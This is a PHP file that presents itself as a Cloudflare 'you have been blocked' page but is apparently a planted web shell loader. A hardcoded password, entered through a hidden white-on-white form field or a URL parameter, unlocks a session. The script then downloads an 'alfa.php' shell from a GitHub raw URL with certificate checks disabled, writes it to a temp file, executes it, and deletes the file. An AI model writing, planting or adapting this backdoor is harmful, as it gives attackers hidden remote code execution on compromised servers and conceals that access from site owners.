<?php
session_start();

function get_user_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function isAuthenticated() {
    return isset($_SESSION['gecko_auth']) && $_SESSION['gecko_auth'] === true;
}

function fetchRemoteContent($url) {
    $context = stream_context_create([
        'http' => [
            'timeout' => 15,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);

    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url, false, $context);
        if ($content !== false) {
            return $content;
        }
    }

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        if ($content !== false) {
            return $content;
        }
    }

    return '';
}

define('SITE_PASSWORD', 'sipurs');
define('GITHUB_RAW_URL', 'https://raw.githubusercontent.com/fitwilliamx1337/f15-shell/refs/heads/main/alfa.php');

$githubRawStatus = '';
$githubRawContent = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password_value'])) {
    if ($_POST['password_value'] === SITE_PASSWORD) {
        $_SESSION['gecko_auth'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = 'Invalid password';
    }
}

if (isset($_GET['p']) && $_GET['p'] === SITE_PASSWORD) {
    $_SESSION['gecko_auth'] = true;
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (!isAuthenticated()) {
    $user_ip = get_user_ip();
} else {
    $remote_php = fetchRemoteContent(GITHUB_RAW_URL);
    if (empty($remote_php)) {
        die('<!-- Error loading content -->');
    }
    $temp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'gecko_' . md5(GITHUB_RAW_URL) . '.php';
    if (file_put_contents($temp_file, $remote_php) === false) {
        die('<!-- Error writing temporary file -->');
    }
    $include_path = realpath($temp_file) ?: $temp_file;
    include $include_path;
    @unlink($temp_file);
    exit;
}

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$blocked_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$ray_id = bin2hex(random_bytes(8));
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sorry, you have been blocked</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            line-height: 1.6;
        }

        .header {
            background-color: #fff;
            padding: 20px 40px;
            border-bottom: 1px solid #ddd;
            width: 100%;
            margin: 0 auto;
            display: flex;
            justify-content: center;
        }

        .header .header-inner {
            width: 100%;
            max-width: 960px;
            text-align: left;
        }

        .header h1 {
            font-size: 48px;
            font-weight: 300;
            color: #333;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 20px;
            color: #666;
            font-weight: 300;
        }

        .browser-window {
            background-color: #e8e8e8;
            overflow: hidden;
            text-align: center;
            padding: 20px 20px 0 20px;
        }

        .browser-window img {
            width: 950px;      
            height: auto;      
            max-width: 100%;   
            display: inline-block;
            vertical-align: bottom;
        }

        .info-section {
            background-color: #fff;
            padding: 40px 40px 50px 40px;
            border-bottom: 1px solid #e5e5e5;
        }

        .info-container {
            max-width: 1100px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            gap: 60px;
        }

        .info-box {
            flex: 1;
            text-align: left;
        }

        .info-box h2 {
            font-size: 30px;
            font-weight: 300;
            color: #222;
            margin-bottom: 15px;
            line-height: 1.2;
        }

        .info-box p {
            font-size: 15px;
            color: #444;
            line-height: 1.7;
            font-weight: 400;
        }

        .footer {
            background-color: #fff;
            padding: 20px 40px;
            text-align: center;
            font-size: 13px;
            color: #666;
        }

        .footer span {
            margin: 0 5px;
        }

        .footer a,
        .footer button {
            color: #0066cc;
            text-decoration: none;
            background: none;
            border: none;
            padding: 0;
            font: inherit;
            cursor: pointer;
        }

        .footer a:hover,
        .footer button:hover {
            text-decoration: underline;
        }

        .click-to-reveal {
            color: #0066cc;
            cursor: pointer;
        }

        .click-to-reveal:hover {
            text-decoration: underline;
        }

        .password-panel {
            margin-top: 0;
            font-size: 13px;
            color: #ffffff;
            display: inline-block;
            vertical-align: middle;
        }

        .password-panel form {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin: 0;
            padding: 0;
        }

        .password-panel input {
            margin-left: 0;
            padding: 6px 8px;
            border: 1px solid #ffffff;
            border-radius: 4px;
            background-color: #ffffff;
            color: #ffffff;
            width: 180px;
        }

        .password-panel input::placeholder {
            color: #ffffff;
        }

        .password-panel button.submit-button {
            margin-left: 8px;
            padding: 6px 10px;
            border: 1px solid #ffffff;
            border-radius: 4px;
            background-color: #ffffff;
            color: #ffffff;
            cursor: pointer;
        }

        .password-panel button.submit-button:hover {
            background-color: #ffffff;
        }
        .password-panel {
            color: #ffffff;
        }
        
        @media (max-width: 768px) {
            .header {
                padding-left: 20px;
            }

            .header h1 {
                font-size: 32px;
            }

            .header p {
                font-size: 16px;
            }

            .info-container {
                flex-direction: column;
                gap: 40px;
            }

            .info-box h2 {
                font-size: 24px;
            }

            .browser-window, .info-section, .header, .footer {
                padding-left: 20px;
                padding-right: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-inner">
            <h1>Sorry, you have been blocked</h1>
            <p>You are unable to access <URL></p>
        </div>
    </div>
    
    <div class="browser-window">
        <br><br>
        <img src="https://l.top4top.io/p_3875iqlof1.png" alt="Cloudflare Block">
    </div>

    <div class="info-section">
        <div class="info-container">
            <div class="info-box">
                <h2>Why have I been blocked?</h2>
                <p>This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.</p>
            </div>
            <div class="info-box">
                <h2>What can I do to resolve this?</h2>
                <p>You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.</p>
            </div>
        </div>
    </div>

    <div class="footer">
        <span>Cloudflare Ray ID: <strong><?php echo $ray_id; ?></strong></span>
        <span>•</span>
        <span>Your IP: <button type="button" class="click-to-reveal" id="user-ip" onclick="revealIP()">Click to reveal</button></span>
        <span>•</span>
        <span>Performance & security by <a href="https://www.cloudflare.com">Cloudflare</a></span><br>
        <div class="password-panel" id="password-panel">
            <form id="password-form" method="post">
                <label for="password-input">Password:</label>
                <input type="password" id="password-input" name="password_value" placeholder="Enter password" autocomplete="off" required aria-label="Password value">
                <input type="hidden" name="password_reveal" value="1">
                <button type="submit" class="submit-button">>>></button>
            </form>
            <?php if ($githubRawStatus !== ''): ?>
                <div style="margin-top: 8px; color: #444; font-size: 12px;">
                    <?php echo htmlspecialchars($githubRawStatus, ENT_QUOTES, 'UTF-8'); ?>
                </div>
            <?php endif; ?>
            <?php if ($githubRawContent !== ''): ?>
                <pre style="margin-top: 10px; padding: 10px; border: 1px solid #ccc; background: #fafafa; color: #111; overflow-x: auto; max-height: 180px;"><?php echo htmlspecialchars(substr($githubRawContent, 0, 2000), ENT_QUOTES, 'UTF-8'); ?><?php echo strlen($githubRawContent) > 2000 ? '\n...output truncated...' : ''; ?></pre>
            <?php endif; ?>
        </div>
    </div>
    <script>
        function revealIP() {
            var ipElement = document.getElementById('user-ip');
            ipElement.textContent = "<?php echo htmlspecialchars($user_ip); ?>";
            ipElement.style.cursor = "default";
            ipElement.classList.remove("click-to-reveal");
            ipElement.onclick = null;
        }

        function hidePasswordPanel() {
            var panel = document.getElementById('password-panel');
            panel.style.display = 'none';
        }
    </script>
</body>
</html>
